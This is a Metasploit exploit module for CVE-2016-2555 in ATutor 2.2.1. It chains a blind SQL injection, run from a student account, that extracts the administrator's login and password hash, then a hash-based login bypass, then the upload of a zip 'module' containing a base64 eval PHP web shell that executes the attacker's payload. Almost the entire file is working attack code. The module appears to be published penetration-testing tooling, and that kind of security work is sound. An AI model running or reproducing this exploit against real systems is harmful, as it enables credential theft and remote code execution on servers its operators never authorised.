##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'ATutor 2.2.1 SQL Injection / Remote Code Execution',
      'Description'    => %q{
         This module exploits a SQL Injection vulnerability and an authentication weakness
         vulnerability in ATutor. This essentially means an attacker can bypass authenication
         and reach the administrators interface where they can upload malcious code.

         You are required to login to the target to reach the SQL Injection, however this
         can be done as a student account and remote registration is enabled by default.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'mr_me <steventhomasseeley[at]gmail.com>', # initial discovery, msf code
        ],
      'References'     =>
        [
          [ 'CVE', '2016-2555'  ],
          [ 'URL', 'http://www.atutor.ca/' ] # Official Website
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Mar 1 2016',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of Atutor', '/ATutor/']),
        OptString.new('USERNAME', [true, 'The username to authenticate as']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with'])
      ],self.class)
  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_error(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def check
    # the only way to test if the target is vuln
    begin
      test_cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      return Exploit::CheckCode::Unknown
    end

    if test_injection(test_cookie)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def create_zip_file
    zip_file      = Rex::Zip::Archive.new
    @header       = Rex::Text.rand_text_alpha_upper(4)
    @payload_name = Rex::Text.rand_text_alpha_lower(4)
    @plugin_name  = Rex::Text.rand_text_alpha_lower(3)

    path = "#{@plugin_name}/#{@payload_name}.php"
    register_file_for_cleanup("#{@payload_name}.php", "../../content/module/#{path}")

    zip_file.add_file(path, "<?php eval(base64_decode($_SERVER['HTTP_#{@header}'])); ?>")
    zip_file.pack
  end

  def exec_code
    send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "mods", @plugin_name, "#{@payload_name}.php"),
      'raw_headers' => "#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\r\n"
    })
  end

  def upload_shell(cookie)
    post_data = Rex::MIME::Message.new
    post_data.add_part(create_zip_file, 'archive/zip', nil, "form-data; name=\"modulefile\"; filename=\"#{@plugin_name}.zip\"")
    post_data.add_part("#{Rex::Text.rand_text_alpha_upper(4)}", nil, nil, "form-data; name=\"install_upload\"")
    data = post_data.to_s
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "mods", "_core", "modules", "install_modules.php"),
      'method' => 'POST',
      'data' => data,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' => cookie,
      'agent' => 'Mozilla'
    })

    if res && res.code == 302 && res.redirection.to_s.include?("module_install_step_1.php?mod=#{@plugin_name}")
       res = send_request_cgi({
         'method' => 'GET',
         'uri'    => normalize_uri(target_uri.path, "mods", "_core", "modules", res.redirection),
         'cookie' => cookie,
         'agent'  => 'Mozilla',
       })
       if res && res.code == 302 && res.redirection.to_s.include?("module_install_step_2.php?mod=#{@plugin_name}")
          res = send_request_cgi({
            'method' => 'GET',
            'uri'    => normalize_uri(target_uri.path, "mods", "_core", "modules", "module_install_step_2.php?mod=#{@plugin_name}"),
            'cookie' => cookie,
            'agent'  => 'Mozilla',
          })
       return true
       end
    end

    # auth failed if we land here, bail
    fail_with(Failure::Unknown, "Unable to upload php code")
    return false
  end

  def get_hashed_password(token, password, bypass)
    if bypass
      return Rex::Text.sha1(password + token)
    else
      return Rex::Text.sha1(Rex::Text.sha1(password) + token)
    end
  end

  def login(username, password, bypass)
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "login.php"),
      'agent' => 'Mozilla',
    })

    token = $1 if res.body =~ /\) \+ \"(.*)\"\);/
    cookie = "ATutorID=#{$1};" if res.get_cookies =~ /; ATutorID=(.*); ATutorID=/
    if bypass
      password = get_hashed_password(token, password, true)
    else
      password = get_hashed_password(token, password, false)
    end

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "login.php"),
      'vars_post' => {
        'form_password_hidden' => password,
        'form_login' => username,
        'submit' => 'Login'
      },
      'cookie' => cookie,
      'agent' => 'Mozilla'
    })
    cookie = "ATutorID=#{$2};" if res.get_cookies =~ /(.*); ATutorID=(.*);/

    # this is what happens when no state is maintained by the http client
    if res && res.code == 302
       if res.redirection.to_s.include?('bounce.php?course=0')
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => normalize_uri(target_uri.path, res.redirection),
          'cookie' => cookie,
          'agent' => 'Mozilla'
        })
        cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
        if res && res.code == 302 && res.redirection.to_s.include?('users/index.php')
           res = send_request_cgi({
             'method'   => 'GET',
             'uri'      => normalize_uri(target_uri.path, res.redirection),
             'cookie' => cookie,
             'agent' => 'Mozilla'
           })
           cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
           return cookie
          end
       else res.redirection.to_s.include?('admin/index.php')
          # if we made it here, we are admin
          return cookie
       end
    end

    # auth failed if we land here, bail
    fail_with(Failure::NoAccess, "Authentication failed with username #{username}")
    return nil
  end

  def perform_request(sqli, cookie)
    # the search requires a minimum of 3 chars
    sqli = "#{Rex::Text.rand_text_alpha(3)}'/**/or/**/#{sqli}/**/or/**/1='"
    rand_key = Rex::Text.rand_text_alpha(1)
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "mods", "_standard", "social", "connections.php"),
      'vars_post' => {
        "search_friends_#{rand_key}" => sqli,
        'rand_key' => rand_key,
        'search' => 'Search People'
      },
      'cookie' => cookie,
      'agent' => 'Mozilla'
    })
    return res.body
  end

   def dump_the_hash(cookie)
    extracted_hash = ""
    sqli = "(select/**/length(concat(login,0x3a,password))/**/from/**/AT_admins/**/limit/**/0,1)"
    login_and_hash_length = generate_sql_and_test(do_true=false, do_test=false, sql=sqli, cookie).to_i
    for i in 1..login_and_hash_length
       sqli = "ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/AT_admins/**/limit/**/0,1),#{i},1))"
       asciival = generate_sql_and_test(false, false, sqli, cookie)
       if asciival >= 0
          extracted_hash << asciival.chr
       end
    end
    return extracted_hash.split(":")
  end

  def get_ascii_value(sql, cookie)
    lower = 0
    upper = 126
    while lower < upper
       mid = (lower + upper) / 2
       sqli = "#{sql}>#{mid}"
       result = perform_request(sqli, cookie)
       if result =~ /There are \d entries./
        lower = mid + 1
       else
        upper = mid
       end
    end
    if lower > 0 and lower < 126
       value = lower
    else
       sqli = "#{sql}=#{lower}"
       result = perform_request(sqli, cookie)
       if result =~ /There are \d entries./
          value = lower
       end
    end
    return value
  end

  def generate_sql_and_test(do_true=false, do_test=false, sql=nil, cookie)
    if do_test
      if do_true
        result = perform_request("1=1", cookie)
        if result =~ /There are \d entries./
          return true
        end
      else not do_true
        result = perform_request("1=2", cookie)
        if not result =~ /There are \d entries./
          return true
        end
      end
    elsif not do_test and sql
      return get_ascii_value(sql, cookie)
    end
  end

  def test_injection(cookie)
    if generate_sql_and_test(do_true=true, do_test=true, sql=nil, cookie)
       if generate_sql_and_test(do_true=false, do_test=true, sql=nil, cookie)
        return true
       end
    end
    return false
  end

  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      private_data: opts[:password],
      origin_type: :service,
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      last_attempted_at: Time.now
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def exploit
    student_cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)
    print_status("Logged in as #{datastore['USERNAME']}, sending a few test injections...")
    report_cred(user: datastore['USERNAME'], password: datastore['PASSWORD'])

    print_status("Dumping username and password hash...")
    # we got admin hash now
    credz = dump_the_hash(student_cookie)
    print_good("Got the #{credz[0]} hash: #{credz[1]} !")
    if credz
      admin_cookie = login(credz[0], credz[1], true)
      print_status("Logged in as #{credz[0]}, uploading shell...")
      # install a plugin
      if upload_shell(admin_cookie)
        print_good("Shell upload successful!")
        # boom
        exec_code
      end
    end
  end
end
